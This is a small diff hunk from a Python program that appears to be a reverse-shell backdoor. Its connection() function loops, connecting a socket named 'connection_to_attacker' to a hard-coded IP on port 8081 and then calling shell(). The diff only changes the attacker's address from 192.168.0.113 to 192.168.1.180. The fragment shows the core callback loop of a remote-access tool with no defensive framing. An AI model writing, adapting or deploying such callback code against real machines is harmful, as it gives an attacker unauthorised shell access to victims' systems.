@@ -276,7 +276,7 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            connection_to_attacker.connect(("192.168.0.113", 8081))
+            connection_to_attacker.connect(("192.168.1.180", 8081))
             shell()
             connection_to_attacker.close()
             break
